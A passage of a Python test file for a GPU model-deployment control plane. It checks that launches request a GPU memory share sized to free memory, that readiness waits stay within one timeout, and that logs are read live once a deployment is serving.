        "tts",
        4096,
        8,
        "tts",
        port=8100,
        gpu_memory_utilization=0.90,
        recipe_dir=tmp_path / "recipes",
    ).content
    assert "env:\n" in tts
    assert "DERATE_TTS_VOICE_DIR: %s/voices" % RUNTIME_CACHE_DIR in tts


# ==========================================================================
# What share of the GPU a launch asks for.
#
# `--gpu-memory-utilization` is a claim on the whole device, not a limit: the
# runtime refuses to start unless that share is FREE. A constant 0.90 asks for
# ninety percent of the machine for a 0.5B model, and on a node with anything
# else running it fails every time.
# ==========================================================================


def test_the_share_asked_for_is_the_share_the_plan_needs():
    """Three real failures from the development box, and what stops them.

    Each of these launches died thirty seconds in with `Free memory on device
    cuda:0 (34.26/120.56 GiB) on startup is less than desired GPU memory
    utilization (0.9, 108.51 GiB)` -- while the fit gate's own record said
    `fits`, basis `live`, 1.8 GiB predicted into 24.0 GiB usable. The gate was
    right; the flag ignored it.
    """
    from control_plane.contracts import DEFAULT_GUARDRAIL
    from control_plane.deploy.utilization import utilization_for

    GIB = 1024**3
    total = int(120.56 * GIB)
    free = int(34.26 * GIB)

    # The 0.5B that could not start on a machine with 34 GiB free.
    tiny = utilization_for(
        needed_bytes=int(1.8 * GIB), device_total_bytes=total, free_bytes=free
    )
    assert tiny * total < free, "must ask for less than is free, or it cannot start"
    assert tiny < DEFAULT_GUARDRAIL

    # A model that needs most of what is free still gets what it needs.
    embedding = utilization_for(
        needed_bytes=int(23.6 * GIB), device_total_bytes=total, free_bytes=free
    )
    assert embedding * total >= 23.6 * GIB, "the plan's own budget is the floor"
    assert embedding * total < free

    # And on an empty machine the guardrail is still the ceiling: this can
    # only ever ask for less than the old constant, never more.
    big = utilization_for(
        needed_bytes=int(200 * GIB), device_total_bytes=total, free_bytes=total
    )
    assert big == pytest.approx(DEFAULT_GUARDRAIL)


def test_an_unknown_reading_degrades_rather_than_refusing():
    """The rule the fit gate already follows, applied to the same question.

    A node that has not been sampled has no live total and no free figure. The
    answer is the guardrail that was there before this existed -- never a
    fraction computed against a denominator of zero, which is not a smaller
    request but an arbitrary one.
    """
    from control_plane.contracts import DEFAULT_GUARDRAIL
    from control_plane.deploy.utilization import MIN_UTILIZATION, utilization_for

    GIB = 1024**3
    assert utilization_for(
        needed_bytes=GIB, device_total_bytes=0, free_bytes=None
    ) == DEFAULT_GUARDRAIL
    assert utilization_for(
        needed_bytes=0, device_total_bytes=120 * GIB, free_bytes=None
    ) == DEFAULT_GUARDRAIL
    # No free reading is not a free reading of zero: the request is sized by
    # the plan and capped only by the guardrail.
    unknown = utilization_for(
        needed_bytes=int(60 * GIB), device_total_bytes=int(120 * GIB), free_bytes=None
    )
    assert 0.5 < unknown < DEFAULT_GUARDRAIL
    # A model far smaller than the floor still gets the floor, so a runtime is
    # never handed a budget with no room for a KV cache in it.
    assert utilization_for(
        needed_bytes=1024, device_total_bytes=int(120 * GIB), free_bytes=int(100 * GIB)
    ) == MIN_UTILIZATION


def test_the_launch_asks_for_what_the_node_can_actually_give(tmp_path):
    """End to end: the flag that reaches sparkrun, on a busy node.

    The registry reports the node holding 100 of its 120 GiB, which is what a
    machine with a llama-server and a notebook on it looks like. The rendered
    command must ask for something that fits in the remaining 20, or the
    launch is refused by the runtime before it reads a byte of the model.
    """
    GIB = 1024**3
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    node = registry.get_node(fx.SPARK_01.node_id)
    node.memory_total = int(120 * GIB)
    node.memory_used = int(100 * GIB)

    manager = make_manager(tmp_path, registry=registry, probe=FakeProbe())
    dep = manager.launch(
        fx.QWEN3_30B_A3B,
        fx.single_node_plan(fx.SPARK_01.node_id),
        fx.fits(),
        "vllm",
        8192,
        64,
    )
    assert wait_for(lambda: manager.adapter.launches)
    argv = manager.adapter.launches[-1]
    asked = float(argv[argv.index("--gpu-mem") + 1])

    assert asked * 120 * GIB < 20 * GIB, (
        "asked for %.2f of a 120 GiB node with 20 GiB free" % asked
    )
    # The recipe and the command line have to agree: `--gpu-mem` is an
    # override and wins, so a recipe still carrying the default would be a
    # file that describes a launch nobody ran.
    recipe = next(iter((tmp_path / "recipes").glob("*.yaml"))).read_text()
    assert "gpu_memory_utilization: %.2f" % asked in recipe
    manager.close()
    assert dep.state is not None


def test_the_whole_of_launching_is_bounded_by_one_ready_timeout(tmp_path):
    """READY_TIMEOUT_S bounds the state, not each half of it.

    `adapter.launch` carries its own timeout and `_wait_for_ready` used to
    start a second, independent one after it returned. The two ran back to
    back and nothing bounded the sum, so a deployment could sit in LAUNCHING
    for twice READY_TIMEOUT_S -- 1800s of sparkrun and then another 1800s of
    polling a port that was never going to answer -- while the refusal it
    finally wrote quoted the single figure. The number in that sentence is
    the one a person waited out, so it has to be the one that bounds them.
    """
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    # Most of the budget goes to the launcher, the way a cold image pull does.
    adapter.launch_delay = 0.6
    manager = DeploymentManager(
        adapter,
        registry,
        state_dir=tmp_path,
        probe_fn=FakeProbe(healthy_by_default=False),  # the port never answers
        autostart=False,
        port_free_fn=lambda port: True,
        ready_poll_interval_s=0.01,
        ready_timeout_s=1.0,
    )
    try:
        started = time.monotonic()
        deployment = manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
        )
        assert wait_for(
            lambda: manager.get(deployment.deployment_id).state is S.FAILED,
            timeout=5.0,
        )
        elapsed = time.monotonic() - started
        # One budget of 1.0s, not 0.6 spent launching and 1.0 more waiting.
        # The bug's value is 1.6 and the fix's is 1.0; 1.35 is between them
        # with room on both sides rather than sitting on either.
        assert elapsed < 1.35, "LAUNCHING ran %.2fs against a 1.0s timeout" % elapsed
        # And the sentence names that budget rather than a fraction of it.
        assert "did not answer within 1s" in manager.get(
            deployment.deployment_id
        ).last_error
    finally:
        manager.close()


def test_the_readiness_probe_is_given_a_timeout_it_can_be_held_to(tmp_path):
    """The one probe in the manager that used to have no timeout of its own.

    It took health.probe's 3.0s default across as many as three URLs --
    `/v1/models` first, then both HEALTH_PATHS -- so a bound-but-hanging port
    could spend 9s inside a loop whose caller asked to poll every 3. Every
    other probe site in the file either derives a timeout or passes one.
    """
    from control_plane.deploy.health import HEALTH_PATHS
    from control_plane.deploy.manager import MIN_PROBE_TIMEOUT_S

    manager = make_manager(tmp_path, ready_poll_interval_s=3.0)
    try:
        # The poll interval, shared out across the models read and the health
        # paths -- an iteration costs about what the caller asked to wait.
        assert manager._ready_probe_timeout() == pytest.approx(
            3.0 / (len(HEALTH_PATHS) + 1)
        )
        # Never zero, however short the caller made the poll.
        (tmp_path / "b").mkdir()
        impatient = make_manager(tmp_path / "b", ready_poll_interval_s=0.001)
        try:
            assert impatient._ready_probe_timeout() >= MIN_PROBE_TIMEOUT_S
        finally:
            impatient.close()
    finally:
        manager.close()


def test_the_launch_does_not_shell_out_to_check_job_on_every_poll(tmp_path):
    """`sparkrun cluster check-job` is a subprocess, and off-host an SSH round
    trip to the node that is busy loading the model. At a 3s poll it was some
    six hundred of them across a long launch, serialized with the probe and
    the sleep, to catch a case the runtime's own words already cover on every
    pass. The first poll still checks, so a launch into a container that is
    already gone fails at once.
    """
    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
    checks: list[str] = []
    inner = adapter.is_running

    def counted(cluster_id, **kwargs):
        checks.append(cluster_id)
        return inner(cluster_id, **kwargs)

    adapter.is_running = counted
    probe = FakeProbe(healthy_by_default=False)
    manager = DeploymentManager(
        adapter,
        registry,
        state_dir=tmp_path,
        probe_fn=probe,
        autostart=False,
        port_free_fn=lambda port: True,
        ready_poll_interval_s=0.001,
        ready_timeout_s=5.0,
    )
    try:
        deployment = manager.launch(
            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
        )
        # Let the readiness loop run a while, then let it succeed.
        assert wait_for(lambda: probe.calls > 40, timeout=5.0)
        polls, shelled = probe.calls, len(checks)
        probe.healthy_by_default = True
        assert wait_for(
            lambda: manager.get(deployment.deployment_id).state is S.READY
        )
        # Checked on the first pass, and well short of once per poll after it.
        assert shelled >= 1
        assert shelled < polls / 2, "%d check-jobs across %d polls" % (shelled, polls)
    finally:
        manager.close()


def test_a_serving_deployment_reads_its_log_live_rather_than_replaying_it(tmp_path):
    """The buffer stops at READY, so after that it is a recording.

    Answering "what is my backend logging" with a snapshot of how it started
    twenty minutes ago is worse than spending a bounded read on the truth --
    and it is exactly what happens if the buffer is preferred whenever it has
    anything in it. A deployment that FAILED is the exception: its buffer holds
    the death, and its container is usually gone, so a live read would come
    back empty and lose the only copy.
    """
    probe = FakeProbe(healthy_by_default=False)
    manager = make_manager(tmp_path, probe=probe)
    manager.adapter.log_tail = "INFO Starting to load model X..."
    dep = manager.launch(
        fx.QWEN3_30B_A3B, fx.single_node_plan(), fx.fits(), "vllm", 8192, 64
    )

    # While it is launching, the buffer is what is being streamed: free, live,
    # and safe for a screen to poll.
    assert wait_for(lambda: manager.log_tail(dep.deployment_id)["source"] == "buffer")

    probe.healthy_by_default = True
    assert wait_for(lambda: manager.get(dep.deployment_id).state is S.READY)
    # Now nothing is following it, so the answer comes from the node.
    manager.adapter.log_tail = "INFO this line only exists now"
    answer = manager.log_tail(dep.deployment_id)
    assert answer["source"] == "read"
    assert any("only exists now" in line for line in answer["lines"])
    manager.close()
